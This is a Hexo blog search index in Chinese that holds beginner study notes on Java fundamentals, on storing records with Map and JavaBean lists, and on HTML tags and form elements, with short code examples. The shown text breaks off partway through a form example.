<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>java概述</title>
    <url>/2020/11/11/00java%E6%A6%82%E8%BF%B0/</url>
    <content><![CDATA[<h3 id="1、java编译解析"><a href="#1、java编译解析" class="headerlink" title="1、java编译解析"></a>1、java编译解析</h3><p>源代码.java——字节码.class———机器码0101010</p>
<p>​                (通过编译器)        （通过jvm虚拟机解析）</p>
<p>常见java程序：Application(应用程序)，Servlet(服务器端小程序)</p>
<h3 id="2、java特性"><a href="#2、java特性" class="headerlink" title="2、java特性"></a>2、java特性</h3><blockquote>
<p>面向对象、跨平台、健壮性</p>
</blockquote>
<ul>
<li>跨平台性：在不同的操作系统只要安装一个java虚拟机，</li>
</ul>
<p>​                          即面向UNIX的jvm、面向Windows的jvm、、、、</p>
<ul>
<li>健壮性：java是一种强类型语言，在编译和运行时进行大量的类型检查</li>
</ul>
<p>​                       java有自动垃圾回收功能GC，防止内存分配的错误</p>
<p>​                       java有异常处理机制exception</p>
<ul>
<li>JAVA SE:标准版 standard edition</li>
<li>JAVE EE:企业版 Enterprise Edition</li>
<li>JAVA ME:用于移动设备和嵌入式设备</li>
</ul>
<h3 id="3、JDK开发环境"><a href="#3、JDK开发环境" class="headerlink" title="3、JDK开发环境"></a>3、JDK开发环境</h3><p>（java开发工具）java的核心类库（JAVA API）、JRE 运行环境（jvm虚拟机+一些核心类库API）</p>
<h3 id="4、dos命令环境"><a href="#4、dos命令环境" class="headerlink" title="4、dos命令环境"></a>4、dos命令环境</h3><p>cd..返回上一级目录，dir当前目录，del删除文件</p>
<p>F:改变路径，cd/返回根目录，cd进入目录</p>
<p>md创建目录  ，rd删除目录 ，</p>
<p>ipconfig ip地址 ，systeminfo查看系统信息，</p>
<p>java -version java版本号</p>
<h3 id="5、配置环境变量"><a href="#5、配置环境变量" class="headerlink" title="5、配置环境变量"></a>5、配置环境变量</h3><ul>
<li><p>在path中编辑，%JAVA_HOME%\bin</p>
</li>
<li><p>添加  变量名    JAVA_HOME,</p>
<p>​          变量值：C:\Program Files (x86)\Java\jdk1.8.0_45</p>
</li>
</ul>
<h3 id="6、DOS命令"><a href="#6、DOS命令" class="headerlink" title="6、DOS命令"></a>6、DOS命令</h3><ul>
<li><p>通过javac hello.java命令调用javac.exe程序，生成字节码文件.class</p>
</li>
<li><p>通过java hello命令，调用java.exe程序，使JVM解析字节码文件</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">hello</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;<span class="comment">//主方法，程序的入口</span></span><br><span class="line">		System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>javaSe</category>
      </categories>
      <tags>
        <tag>javaSe</tag>
      </tags>
  </entry>
  <entry>
    <title>存储数据模式</title>
    <url>/2020/11/11/00%E5%AD%98%E5%82%A8%E6%95%B0%E6%8D%AE%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h4 id="一、利用Map键值对"><a href="#一、利用Map键值对" class="headerlink" title="一、利用Map键值对"></a>一、利用Map键值对</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//一个map对象一行记录</span></span><br><span class="line">Map map=<span class="keyword">new</span> HashMap();</span><br><span class="line">map.put(<span class="string">&quot;id&quot;</span>,<span class="string">&quot;0001&quot;</span>);</span><br><span class="line">map.put(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">Map map1=<span class="keyword">new</span> HashMap();</span><br><span class="line">map1.put(<span class="string">&quot;id&quot;</span>,<span class="string">&quot;0002&quot;</span>);</span><br><span class="line">map1.put(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;aba&quot;</span>);</span><br><span class="line"></span><br><span class="line">List&lt;Map&gt; list=<span class="keyword">new</span> ArrayList&lt;Map&gt;();</span><br><span class="line">list.add(map);</span><br><span class="line">list.add(map1);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printStudent</span><span class="params">(List&lt;Map&gt; list)</span></span>&#123;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;list.size();i++)&#123;</span><br><span class="line">     Map tempMap=list.get(i);</span><br><span class="line">     System.out.println(<span class="string">&quot;id号&quot;</span>+tempMap.get(<span class="string">&quot;id&quot;</span>)+<span class="string">&quot;姓名&quot;</span>+tempMap.get(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="二、利用构造器，使用list存储（javabean）"><a href="#二、利用构造器，使用list存储（javabean）" class="headerlink" title="二、利用构造器，使用list存储（javabean）"></a>二、利用构造器，使用list存储（javabean）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Student j=<span class="keyword">new</span> Student(<span class="number">18</span>,<span class="string">&quot;张无忌&quot;</span>);</span><br><span class="line">Student j2=<span class="keyword">new</span> Student(<span class="number">19</span>,<span class="string">&quot;李寻欢&quot;</span>);</span><br><span class="line"></span><br><span class="line">List&lt;Student&gt; list=<span class="keyword">new</span> ArrayList&lt;Student&gt;();</span><br><span class="line">list.add(j);</span><br><span class="line">list.add(j2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(<span class="keyword">int</span> id, String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>javaSe</category>
      </categories>
      <tags>
        <tag>javaSe</tag>
      </tags>
  </entry>
  <entry>
    <title>html</title>
    <url>/2020/09/11/01Html/</url>
    <content><![CDATA[<p><strong>网页</strong>是放在服务器上一个文件，浏览网页时，文件会被下载电脑上，由浏览器解析</p>
<p><strong>网站</strong>就是一个绑定了域名的文件夹，该文件夹中可以包含子文件夹以及各种各样的文件（网页），这些文件都可以通过域名来访问。</p>
<h1 id="html"><a href="#html" class="headerlink" title="html"></a>html</h1><p>（1）有开始标签和结束标签</p>
<p>（2）空标签《br/》==《br》《/br》 </p>
<p>（3）不分大小写</p>
<h2 id="head"><a href="#head" class="headerlink" title="head"></a>head</h2><p>《title》表示文档的标题</p>
<p>《link》配合href属性引用外部CSS文件</p>
<p>《style》内部编写CSS样式    </p>
<p>《script》配合src属性引入外部javaScript文件</p>
<p><strong>src</strong>   表示来源地址，用来引入地址中的内容，浏览器在解析引入文件时，会停止对后续文档的处理，直到 src 的内容加载完毕</p>
<p><strong>href</strong> 表示超文本引用，href 属性中的内容只是与当前页面有关联，然后当前页面对它进行一次引用。</p>
<h2 id="body"><a href="#body" class="headerlink" title="body"></a>body</h2><ul>
<li><p>《p》标签用来表示一个段落，能容纳一段文本；</p>
</li>
<li><p>《a》标签用来表示一个超链接，用鼠标点击后可以跳转到其它网页；</p>
</li>
<li><p>《ul》《ol》标签用来表示一个列表，其中的每个 <li> 都是子标签，用来表示一个列表项。</p>
</li>
</ul>
<h2 id="一、基本标签"><a href="#一、基本标签" class="headerlink" title="一、基本标签"></a>一、基本标签</h2><h3 id="1、文件标签"><a href="#1、文件标签" class="headerlink" title="1、文件标签"></a>1、文件标签</h3><p>body: text,bgcolor 背景颜色,background背景图片</p>
<h3 id="2、排版标签"><a href="#2、排版标签" class="headerlink" title="2、排版标签"></a>2、排版标签</h3><!-- 注释文字 -->

<p>换行&lt; br/&gt;</p>
<p> 文段&lt; p&gt;  段与段之间存在空行</p>
<p>​        属性align对齐方式left/center/right</p>
<p>水平线：&lt; hr/&gt;  width/size/color/align</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		白日依山尽<span class="tag">&lt;<span class="name">br</span>&gt;</span>黄河入海流</span><br><span class="line">		<span class="tag">&lt;<span class="name">hr</span> <span class="attr">width</span>=<span class="string">&quot;500px&quot;</span> <span class="attr">align</span>=<span class="string">&quot;left&quot;</span><span class="attr">color</span>=<span class="string">&quot;blue&quot;</span> <span class="attr">size</span>=<span class="string">&quot;10&quot;</span>/&gt;</span> </span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">&quot;left&quot;</span>&gt;</span>服务器一般放在专业的机<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>另外，为了让服务器<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- &lt;文字标签&gt; --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">&quot;4&quot;</span> <span class="attr">color</span>=<span class="string">&quot;seagreen&quot;</span>&gt;</span>哈哈哈<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">&quot;5&quot;</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span>&gt;</span>哈哈哈<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">hr</span> &gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- 标题自动换行 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>哈哈哈<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>哈哈哈<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h3</span>&gt;</span>哈哈哈<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h4</span>&gt;</span>哈哈哈<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3、块标签"><a href="#3、块标签" class="headerlink" title="3、块标签"></a>3、块标签</h3><p>div 块级标签（独占一行或多行）</p>
<p>span 行级标签（同一行，若同一行放不下才换行）</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;background-color: aquamarine;&quot;</span>&gt;</span></span><br><span class="line">    春眠不觉晓<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;background-color: blue;&quot;</span>&gt;</span></span><br><span class="line">    处处闻啼鸟</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;background-color: black;&quot;</span>&gt;</span>span1sssss<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;background-color: blue;&quot;</span>&gt;</span>span2<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="4、文字标签"><a href="#4、文字标签" class="headerlink" title="4、文字标签"></a>4、文字标签</h3><h4 id="（1）font"><a href="#（1）font" class="headerlink" title="（1）font"></a>（1）font</h4><p>color/size/face文字类型</p>
<h4 id="（2）标题标签"><a href="#（2）标题标签" class="headerlink" title="（2）标题标签"></a>（2）标题标签</h4><p>h1–h6   随着数字的增大逐渐变小，字体是加粗的，内置字号 默认占据一行</p>
<h3 id="5、列表标签"><a href="#5、列表标签" class="headerlink" title="5、列表标签"></a>5、列表标签</h3><h4 id="（1）无序标签-ul"><a href="#（1）无序标签-ul" class="headerlink" title="（1）无序标签 ul"></a>（1）无序标签 ul</h4><p>type：有三个值，分别为disc、 square和circle</p>
<h4 id="（2）有序标签-ol"><a href="#（2）有序标签-ol" class="headerlink" title="（2）有序标签 ol"></a>（2）有序标签 ol</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- 无序列表 unorderlist --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ul</span> <span class="attr">type</span>=<span class="string">&quot;square&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span>&gt;</span>苹果<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span>&gt;</span>西瓜<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span>&gt;</span>葡萄<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- 有序列表 orderlist --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ol</span> <span class="attr">type</span>=<span class="string">&quot;1&quot;</span> <span class="attr">start</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span>&gt;</span>苹果<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span>&gt;</span>西瓜<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span>&gt;</span>葡萄<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span>&gt;</span>香蕉<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">				</span><br><span class="line">			<span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="6、图形标签"><a href="#6、图形标签" class="headerlink" title="6、图形标签"></a>6、图形标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;image/1.jpg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;6000px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;6000px&quot;</span> <span class="attr">border</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="7、链接标签"><a href="#7、链接标签" class="headerlink" title="7、链接标签"></a>7、链接标签</h3><p>a </p>
<p>href:跳转页面地址</p>
<p>name:名称，锚点</p>
<p>target ：_self(自己)  _blank（新页面，之前的页面还有）</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_self&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">&quot;500&quot;</span> <span class="attr">color</span>=<span class="string">&quot;blue&quot;</span>&gt;</span>点击跳转到百度<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;images.html&quot;</span><span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span>&gt;</span>图片1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#bottom&quot;</span>&gt;</span>到达底部<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#middle&quot;</span>&gt;</span>到达中部<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"> 嘻嘻嘻嘻嘻嘻嘻嘻嘻嘻<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">name</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="8、表格标签"><a href="#8、表格标签" class="headerlink" title="8、表格标签"></a>8、表格标签</h3><p>tr–th/td</p>
<p>th标签默认居中，td标签默认靠左</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span> <span class="attr">width</span>=<span class="string">&quot;50%&quot;</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span> <span class="attr">bgcolor</span>=<span class="string">&quot;yellow&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">caption</span>&gt;</span>表标题<span class="tag">&lt;/<span class="name">caption</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 行标题th --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>学号<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>性别<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>2-1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;left&quot;</span>&gt;</span>2-2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>2-3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>2-1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>2-2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 跨行 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>2-3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 跨列 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span>3-1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="二、表单标签"><a href="#二、表单标签" class="headerlink" title="二、表单标签"></a>二、表单标签</h2><h3 id="form"><a href="#form" class="headerlink" title="form"></a>form</h3><p>name:表单名称、action:提交的路径地址、<strong>method:提交方式（get和post）</strong></p>
<p><strong>form里面嵌套table</strong></p>
<p><strong>get和post的区别</strong></p>
<p>(1)get提交将数据加在地址栏的后面，格式?name=value&amp;name=value；post提交将数据封装在请求体中<br>    ?username=zhangsan&amp;password=123&amp;sex=male&amp;hobby=football&amp;hobby=paiqiu&amp;city=bj#</p>
<p>(2)get提交相对不安全；post提交相对安全</p>
<p>(3)get提交有大小限制，根据浏览器不同而不同；post不限制大小                            </p>
<h3 id="2-1-input"><a href="#2-1-input" class="headerlink" title="2.1 input"></a>2.1 input</h3><p>type属性： text、password、radio、checkbox、file、button、submit、reset(重置按钮)、</p>
<p>​                    image（图片按钮）</p>
<p>​                    hidden  隐藏表单   作用是在<strong>提交数据的时候，服务器需要这个数据，但是不需要用户看到</strong>。</p>
<p><strong>name属性一定要写</strong></p>
<h3 id="2-2-select"><a href="#2-2-select" class="headerlink" title="2.2 select"></a>2.2 select</h3><p><strong>下拉框</strong></p>
<p>name</p>
<p>option可选项： value 表单项中的值、selected 默认被选中</p>
<h3 id="2-3-testArea"><a href="#2-3-testArea" class="headerlink" title="2.3 testArea"></a>2.3 testArea</h3><p><strong>文本域</strong>，cols列数 rows 行数</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- method-&gt;get/post --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;selvet&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">table</span> &gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">td</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> /&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">				</span><br><span class="line">				<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">td</span>&gt;</span>密码<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> /&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">				</span><br><span class="line">				<span class="comment">&lt;!-- 单选框 --&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">td</span>&gt;</span>性别<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">id</span>=<span class="string">&quot;male&quot;</span> /&gt;</span>男</span><br><span class="line">						<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">id</span>=<span class="string">&quot;female&quot;</span> <span class="attr">checked</span>=<span class="string">&quot;checked&quot;</span> /&gt;</span>女</span><br><span class="line">					<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">				</span><br><span class="line">				<span class="comment">&lt;!-- 复选框 --&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">						爱好</span><br><span class="line">					<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">					</span><br><span class="line">					<span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">id</span>=<span class="string">&quot;football&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">checked</span>=<span class="string">&quot;checked&quot;</span> /&gt;</span>足球</span><br><span class="line">						<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">id</span>=<span class="string">&quot;basketball&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span>篮球</span><br><span class="line">						<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">id</span>=<span class="string">&quot;baseball&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span>排球</span><br><span class="line">					<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">				</span><br><span class="line">				<span class="comment">&lt;!-- 下拉框 --&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">						地址</span><br><span class="line">					<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;city&quot;</span>&gt;</span></span><br><span class="line">							<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;beijing&quot;</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">							<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span> =<span class="string">&quot;shanghai&quot;</span> <span class="attr">selected</span>=<span class="string">&quot;selected&quot;</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">							<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span> =<span class="string">&quot;guangzhou&quot;</span>&gt;</span>广州<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">					</span><br><span class="line">						<span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;area&quot;</span>&gt;</span></span><br><span class="line">							<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;cp&quot;</span>&gt;</span>昌平区<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">							<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span> =<span class="string">&quot;haidin&quot;</span> <span class="attr">selected</span>=<span class="string">&quot;selected&quot;</span>&gt;</span>海淀区<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">				</span><br><span class="line">				<span class="tag">&lt;<span 